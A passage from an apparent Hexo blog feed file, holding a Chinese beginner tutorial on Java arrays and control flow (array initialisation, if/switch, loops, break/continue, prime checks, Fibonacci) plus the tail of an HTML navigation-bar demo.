class="selector-pseudo">:hover</span>&#123;</span></span><br><span class="line">				background-color: orange;</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;nav&quot;</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>网站栏目<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>网站栏目<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>网站栏目<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>网站栏目<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>网站栏目<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>网站栏目<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>网站栏目<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>网站栏目<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">div</span>&gt;</span>		</span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>数组&amp;流程控制</title>
    <url>/2020/11/11/01%E6%95%B0%E7%BB%84&amp;%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/</url>
    <content><![CDATA[<h3 id="一、一维数组"><a href="#一、一维数组" class="headerlink" title="一、一维数组"></a>一、一维数组</h3><blockquote>
<p>一维数组：相同属性数据类型的集合</p>
<p>基本数据类型的数组(  int [ ] a)、引用数据类型的数组（Student [] student）</p>
</blockquote>
<h4 id="1、声明"><a href="#1、声明" class="headerlink" title="1、声明"></a>1、声明</h4><p>（在栈空间创建对象，存放地址）int []a     （ int [40]a错误）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> []arr1;             <span class="comment">//声明</span></span><br></pre></td></tr></table></figure>



<h4 id="2、初始化"><a href="#2、初始化" class="headerlink" title="2、初始化"></a>2、初始化</h4><blockquote>
<p><strong>在堆空间开辟一块连续的空间</strong></p>
</blockquote>
<h5 id="2-1-静态初始化"><a href="#2-1-静态初始化" class="headerlink" title="2.1 静态初始化"></a>2.1 静态初始化</h5><p>长度系统指定   int []a=new int[]{1,2,3} //简化int []a={1,2,3},声明和初始化不能分开写</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//静态初始化声明和初始化不能分开</span></span><br><span class="line"><span class="keyword">int</span> []arr=<span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">10</span>,<span class="number">30</span>,<span class="number">34</span>&#125;;      <span class="comment">//声明+初始化</span></span><br></pre></td></tr></table></figure>

<a id="more"></a>

<h5 id="2-2-动态初始化"><a href="#2-2-动态初始化" class="headerlink" title="2.2 动态初始化"></a>2.2 动态初始化</h5><p>数组元素初始值系统指定 int []arr=new int[2];</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> []a1=<span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">3</span>];</span><br><span class="line">a1[<span class="number">1</span>]=<span class="number">1</span>;  a1[<span class="number">2</span>]=<span class="number">2</span>; a1[<span class="number">3</span>]=<span class="number">3</span>;</span><br></pre></td></tr></table></figure>



<h5 id="2-3-数组的长度"><a href="#2-3-数组的长度" class="headerlink" title="2.3 数组的长度"></a>2.3 数组的长度</h5><p>长度：数组名.length</p>
<p>数组的地址：数组名</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(<span class="string">&quot;第一个数组的长度&quot;</span>+arr.length);</span><br><span class="line">System.out.println(<span class="string">&quot;第一个数组的地址&quot;</span>+arr);</span><br><span class="line">System.out.println(<span class="string">&quot;第一个数组元素：&quot;</span>+arr[<span class="number">0</span>]);</span><br><span class="line">arr[<span class="number">0</span>]=<span class="number">50</span>;   <span class="comment">//数组的赋值</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//将a2地址给a3。a2和a3指向同一个栈的数组空间</span></span><br><span class="line"><span class="keyword">int</span> []a1=<span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">3</span>];</span><br><span class="line"><span class="keyword">int</span> []a2=<span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">3</span>];</span><br><span class="line"><span class="keyword">int</span> []a3=a2</span><br></pre></td></tr></table></figure>



<h5 id="2-4-默认值"><a href="#2-4-默认值" class="headerlink" title="2.4 默认值"></a>2.4 默认值</h5><blockquote>
<p>0,0.0,空字符‘\u0000’,false,null</p>
</blockquote>
<h5 id="2-5-数组的异常"><a href="#2-5-数组的异常" class="headerlink" title="2.5 数组的异常"></a>2.5 数组的异常</h5><p>​            数组越界异常 ArrayIndexOutOfBoundException</p>
<p>​            空指针异常 NullPointerException</p>
<h5 id="2-6-遍历"><a href="#2-6-遍历" class="headerlink" title="2.6 遍历"></a>2.6 遍历</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span>  <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">getMax</span><span class="params">(<span class="keyword">int</span> array[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> max=array[<span class="number">0</span>];   <span class="comment">//指定最大值为数组的第一个元素</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;array.length;i++)&#123;</span><br><span class="line">     <span class="comment">//从数组的第二个元素进行遍历</span></span><br><span class="line">        <span class="keyword">if</span>(max&lt;=array[i]) &#123;</span><br><span class="line">            max = array[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> max;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20200720154307341.png" alt="image-20200720154307341"></p>
<h3 id="二、二维数组"><a href="#二、二维数组" class="headerlink" title="二、二维数组"></a>二、二维数组</h3><blockquote>
<p>int[] x,y[];    x是一维数组,y是二维数组</p>
</blockquote>
<h4 id="1、声明-1"><a href="#1、声明-1" class="headerlink" title="1、声明"></a>1、声明</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> [] []a</span><br></pre></td></tr></table></figure>



<h4 id="2、初始化-1"><a href="#2、初始化-1" class="headerlink" title="2、初始化"></a>2、初始化</h4><h5 id="2-1-静态初始化-1"><a href="#2-1-静态初始化-1" class="headerlink" title="2.1 静态初始化"></a>2.1 静态初始化</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> [][]a0=<span class="keyword">new</span> <span class="keyword">int</span>[][]&#123;&#123;<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;, &#123;<span class="number">4</span>, <span class="number">5</span>&#125;, &#123;<span class="number">4</span>, <span class="number">5</span>&#125;&#125;;</span><br><span class="line"><span class="keyword">int</span>[][] a1 = &#123;&#123;<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;, &#123;<span class="number">4</span>, <span class="number">5</span>&#125;, &#123;<span class="number">4</span>, <span class="number">5</span>&#125;&#125;;</span><br></pre></td></tr></table></figure>



<h5 id="2-2-动态初始化-1"><a href="#2-2-动态初始化-1" class="headerlink" title="2.2 动态初始化"></a>2.2 动态初始化</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span>[][] a = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">2</span>][<span class="number">2</span>];  <span class="comment">//定义一个2*2的二维数组</span></span><br><span class="line"> a[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">60</span>;</span><br><span class="line"> a[<span class="number">0</span>][<span class="number">1</span>] = <span class="number">50</span>;</span><br><span class="line"> a[<span class="number">1</span>][<span class="number">0</span>] = <span class="number">80</span>;</span><br><span class="line"> a[<span class="number">1</span>][<span class="number">1</span>] = <span class="number">70</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span>[][] a3 = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">3</span>][];</span><br><span class="line">a3[<span class="number">0</span>] = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">2</span>, <span class="number">4</span>&#125;;     <span class="comment">//a3[0]=&#123;2,4&#125;;错误</span></span><br><span class="line">a3[<span class="number">1</span>] = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">3</span>, <span class="number">5</span>&#125;;</span><br><span class="line">a3[<span class="number">2</span>] = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">8</span>, <span class="number">9</span>&#125;;</span><br><span class="line">System.out.println(a3);  <span class="comment">//二维数组的地址值</span></span><br><span class="line">System.out.println(a3[<span class="number">0</span>]);</span><br><span class="line"><span class="comment">//二维数组的第一个一维数组的地址值</span></span><br><span class="line">System.out.println(a3[<span class="number">1</span>][<span class="number">1</span>]);  <span class="comment">//5</span></span><br></pre></td></tr></table></figure>



<h4 id="3、遍历"><a href="#3、遍历" class="headerlink" title="3、遍历"></a>3、遍历</h4><ul>
<li><p>外循环控制的是二维数组的长度，其实就是一维数组的个数。</p>
</li>
<li><p>内循环控制的是一维数组的长度。</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">showAll</span><span class="params">(<span class="keyword">int</span> a[][])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; a.length; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; a[i].length; j++) &#123;</span><br><span class="line">            System.out.print(a[i][j] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="4、矩阵的逆置，对角线交换"><a href="#4、矩阵的逆置，对角线交换" class="headerlink" title="4、矩阵的逆置，对角线交换"></a>4、矩阵的逆置，对角线交换</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span>[][] arrays1 = &#123;&#123;<span class="number">2</span>, <span class="number">3</span>, <span class="number">2</span>&#125;, &#123;<span class="number">4</span>, <span class="number">8</span>, <span class="number">5</span>&#125;, &#123;<span class="number">7</span>, <span class="number">6</span>, <span class="number">7</span>&#125;&#125;;</span><br><span class="line">showAll(arrays1);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arrays1.length - <span class="number">1</span>; i++) &#123; </span><br><span class="line">    <span class="comment">//控制行数，若不减一，则对角线也会交换</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>;j &lt; arrays1[i].length;j++)&#123;    <span class="comment">//控制列数</span></span><br><span class="line">       <span class="keyword">int</span> temp = arrays1[i][j];</span><br><span class="line">       arrays1[i][j] = arrays1[j][i];</span><br><span class="line">       arrays1[j][i] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println();</span><br><span class="line">showAll(arrays1);</span><br></pre></td></tr></table></figure>



<img src="https://csn.damyoung.cn/image-20200717172822041.png" alt="image-20200717172822041" style="zoom:80%;" />

<h3 id="四、分支结构"><a href="#四、分支结构" class="headerlink" title="四、分支结构"></a>四、分支结构</h3><h4 id="1、if"><a href="#1、if" class="headerlink" title="1、if"></a>1、if</h4><blockquote>
<p>格式：if(判断（返回布尔类型）){<br>​                   语句块<br>​             }else if{<br>​             }else{        }<br>​<strong>判断结果必须是布尔类型</strong></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Scanner sc = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">System.out.println(<span class="string">&quot;请输入是否会员：（是Y/否N）&quot;</span>);</span><br><span class="line">String a = sc.next();</span><br><span class="line">System.out.println(<span class="string">&quot;消费金额&quot;</span>);</span><br><span class="line"><span class="keyword">int</span> b = sc.nextInt();</span><br><span class="line"><span class="keyword">if</span> (b &lt; <span class="number">200</span>) &#123;</span><br><span class="line">     <span class="keyword">if</span> (a.equals(<span class="string">&quot;Y&quot;</span>)) &#123;</span><br><span class="line">     System.out.println(<span class="string">&quot;打9.5折&quot;</span>+<span class="string">&quot;消费了&quot;</span>+b*<span class="number">0.95</span>+<span class="string">&quot;元&quot;</span>);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           System.out.println(<span class="string">&quot;不打折&quot;</span>+<span class="string">&quot;消费了&quot;</span>+b+<span class="string">&quot;元&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">     &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (a.equals(<span class="string">&quot;Y&quot;</span>)) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;打8折&quot;</span>+<span class="string">&quot;消费了&quot;</span>+b*<span class="number">0.8</span>+<span class="string">&quot;元&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">         System.out.println(<span class="string">&quot;打9折&quot;</span>+<span class="string">&quot;消费了&quot;</span>+b*<span class="number">0.9</span>+<span class="string">&quot;元&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>



<h4 id="2、switch"><a href="#2、switch" class="headerlink" title="2、switch"></a>2、switch</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span>格式： <span class="keyword">switch</span>(表达式(值))&#123; <span class="comment">//表达式和变量</span></span><br><span class="line">      <span class="keyword">case</span> 值<span class="number">1</span>:  <span class="comment">//必须为常数</span></span><br><span class="line">          语句体<span class="number">1</span>;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> 值<span class="number">2</span>:</span><br><span class="line">          语句体<span class="number">2</span>;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> 值<span class="number">3</span>:  </span><br><span class="line">          语句体<span class="number">3</span>;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">         ....</span><br><span class="line"></span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">          语句体n;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>表达式:能够支持的数据类型（ <strong>byte/short/int/char/String/enum）</strong>  </li>
</ul>
<p>​        <strong>不能为浮点型，布尔型, long。</strong></p>
<p>​        JDK7的版本是可以支持字符串</p>
<ul>
<li><p>根据表达式的值来确定执行哪一个case，这个case会和表达式的值进行比较，如果命中则执行对应的语句体  </p>
</li>
<li><p> 如果未命中，执行default语句    </p>
</li>
<li><p><strong>break</strong>  </p>
<ul>
<li>跳出语句结束switch，若无break,程序<strong>穿透</strong>，会继续执行下面语句 </li>
<li>break后面不可以加代码，因为不会执行 </li>
</ul>
</li>
<li><p><strong>case</strong>   </p>
<ul>
<li>后面的值<strong>只能常量</strong>，故switch用于多个常量执行判断       </li>
<li>case后面跟着的数据类型必须和表达式的值的数据类型完全一致</li>
</ul>
</li>
<li><p><strong>default</strong> 一般位于switch最后面</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> (month) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        System.out.println(<span class="string">&quot;春天&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        System.out.println(<span class="string">&quot;夏天&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">        System.out.println(<span class="string">&quot;秋天&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        System.out.println(<span class="string">&quot;冬天&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">    System.out.println(<span class="string">&quot;输出非法&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>





<h3 id="五、循环结构"><a href="#五、循环结构" class="headerlink" title="五、循环结构"></a>五、循环结构</h3><h4 id="1、for"><a href="#1、for" class="headerlink" title="1、for"></a>1、for</h4><blockquote>
<p>for(初始化语句，条件表达语句（boolean类型），变量更新语句){<br>​        循环体<br> }</p>
</blockquote>
<ul>
<li><p>返回的true，表示继续执行这个循环C，返回的false，表示结束这个循环</p>
</li>
<li><p>判断语句，返回的结果必须是boolean类型</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//打印五次</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;砺峰科技&quot;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<h4 id="2、while"><a href="#2、while" class="headerlink" title="2、while"></a>2、while</h4><blockquote>
<p>while格式：<br>        变量初始化语句<br>       while(条件表达式){<br>            循环体语句；<br>            变量变更语句;<br>       }</p>
</blockquote>
<ul>
<li><p>while和for的差别:</p>
<p><strong>for适用于循环次数确定时，while可用于循环次数不可知情况。</strong></p>
</li>
<li><p>可以用于判断循环次数</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1+2+3+…+100的过程中，求加到哪一个数的时候其和刚刚超过1000</span></span><br><span class="line"><span class="keyword">int</span> sum=<span class="number">0</span>,i=<span class="number">1</span>;		<span class="comment">//变量初始化语句</span></span><br><span class="line"><span class="keyword">while</span> (sum &lt;<span class="number">1000</span><span class="comment">//条件表达式,判断语句) &#123;</span></span><br><span class="line">    sum+=i;		<span class="comment">//循环体语句</span></span><br><span class="line">    i++;   <span class="comment">//变量变更语句</span></span><br><span class="line">&#125;</span><br><span class="line">System.out.println(i-<span class="number">1</span>);  <span class="comment">//由于最后多加了一次</span></span><br></pre></td></tr></table></figure>

<h4 id="3、do-while"><a href="#3、do-while" class="headerlink" title="3、do-while"></a>3、do-while</h4><blockquote>
<p><strong>先执行再判断，循环体语句至少执行一次</strong></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">格式：</span><br><span class="line">变量声明语句</span><br><span class="line"><span class="keyword">do</span>&#123;循环体语句；</span><br><span class="line">       变量扩展语句；</span><br><span class="line">&#125;<span class="keyword">while</span>(判断语句);</span><br></pre></td></tr></table></figure>

<p>   若需求要求进入循环体的，要再输出一条语句，使用do-while</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Scanner sc=<span class="keyword">new</span> Scanner(System.in);</span><br><span class="line"> <span class="keyword">int</span> psw;</span><br><span class="line"> <span class="keyword">do</span>&#123;</span><br><span class="line">     System.out.println(<span class="string">&quot;请输入密码（五位）:&quot;</span>);</span><br><span class="line">     psw=sc.nextInt();</span><br><span class="line"> &#125;<span class="keyword">while</span>(psw!=<span class="number">12354</span>);</span><br><span class="line"> System.out.println(<span class="string">&quot;登录成功&quot;</span>);</span><br></pre></td></tr></table></figure>

<h4 id="4、二次循环"><a href="#4、二次循环" class="headerlink" title="4、二次循环"></a>4、二次循环</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">  <span class="comment">//输出等腰三角形</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">4</span>-i;j++)&#123;</span><br><span class="line">        System.out.print(<span class="string">&quot; &quot;</span>);</span><br><span class="line">    &#125;  				<span class="comment">//倒三角型</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;<span class="number">2</span>*i+<span class="number">1</span>;k++)&#123;</span><br><span class="line">        System.out.print(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">    &#125;			<span class="comment">// 按1 3 5 7 9输出三角形</span></span><br><span class="line">    System.out.println();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//九九乘法表</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=i;j++)&#123;</span><br><span class="line">          <span class="keyword">int</span> a=i*j;</span><br><span class="line">          System.out.print(i+<span class="string">&quot;*&quot;</span>+j+<span class="string">&quot;=&quot;</span>+a+<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      System.out.println()</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>



<h3 id="六、流程控制语句"><a href="#六、流程控制语句" class="headerlink" title="六、流程控制语句"></a>六、流程控制语句</h3><h4 id="1、break"><a href="#1、break" class="headerlink" title="1、break"></a>1、break</h4><p><strong>跳出整个循环</strong></p>
<h4 id="2、continue"><a href="#2、continue" class="headerlink" title="2、continue"></a>2、continue</h4><p><strong>跳出当次循环</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//死循环，+上break判断跳出死循环</span></span><br><span class="line"><span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;i&quot;</span>+(++i));</span><br><span class="line">    <span class="keyword">if</span>(i==<span class="number">10</span>)&#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//循环输入一个Java课程5个学生的成绩，统计大于80分的人数    </span></span><br><span class="line">canner sc=<span class="keyword">new</span> Scanner(System.in);</span><br><span class="line"><span class="keyword">int</span> count=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">5</span>;i++)&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;请输入第&quot;</span>+i+<span class="string">&quot;个学生的成绩&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> a=sc.nextInt();</span><br><span class="line">    <span class="keyword">if</span>(a&lt;<span class="number">80</span>)&#123;</span><br><span class="line">       <span class="keyword">continue</span>;</span><br><span class="line">         &#125;</span><br><span class="line">       count++;</span><br><span class="line">        &#125;</span><br><span class="line">System.out.println(<span class="string">&quot;大于等于80分的人数是&quot;</span>+count)    </span><br></pre></td></tr></table></figure>



<h3 id="七、简单算法"><a href="#七、简单算法" class="headerlink" title="七、简单算法"></a>七、简单算法</h3><h4 id="1、素数判断"><a href="#1、素数判断" class="headerlink" title="1、素数判断"></a>1、素数判断</h4><h5 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h5><blockquote>
<p>标记判断，除数字1 和自身外是否被其他数整除</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//加入break，标记flag判断</span></span><br><span class="line">Scanner sc = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">System.out.println(<span class="string">&quot;输入一个数字：&quot;</span>);</span><br><span class="line"><span class="keyword">int</span> a = sc.nextInt();</span><br><span class="line"><span class="keyword">boolean</span> flag=<span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">2</span>; j &lt; a; j++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (a % j == <span class="number">0</span>) &#123;       <span class="comment">//进入循环体的都不是素数</span></span><br><span class="line">        flag=<span class="keyword">false</span>;     <span class="comment">//标记，如果不是素数，flag一直是true</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(flag)&#123;</span><br><span class="line">	 System.out.println(<span class="string">&quot;是素数&quot;</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> 	 System.out.println(<span class="string">&quot;不是素数&quot;</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h5 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h5><blockquote>
<p>判断整除次数</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//除了1和本身能整除，其他都不能，若是count&lt;=2，是素数</span></span><br><span class="line">Scanner sc = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">System.out.println(<span class="string">&quot;输入一个数字：&quot;</span>);</span><br><span class="line"><span class="keyword">int</span> a = sc.nextInt();</span><br><span class="line"><span class="keyword">int</span> count = <span class="number">0</span>;   <span class="comment">//if temp&gt;2不是素数</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= a; j++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (a % j == <span class="number">0</span>) &#123;</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (count &lt;= <span class="number">2</span>) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;这个数是素数&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;这个数不是素数&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="2、斐波那契数列"><a href="#2、斐波那契数列" class="headerlink" title="2、斐波那契数列"></a>2、斐波那契数列</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="keyword">int</span> a=<span class="number">1</span>,b=<span class="number">1</span>,c=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">double</span> sum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;<span class="number">21</span>;i++)&#123;</span><br><span class="line">    c=a+b;</span><br><span class="line">    System.out.println(c+<span class="string">&quot;/&quot;</span>+b+<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">    sum+=c*<span class="number">1.0</span>/b;</span><br><span class="line">    a=b;</span><br><span class="line">    b=c;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(sum);</span><br><span class="line">&#125;   <span class="comment">//2/1  3/2  5/3........</span></span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>javaSe</category>
      </categories>
      <tags>
        <tag>javaSe</tag>
      </tags>
  </entry>
  <entry>
    <title>tomcat</title>
    <url>/2020/11/11/02TomCat/</url>
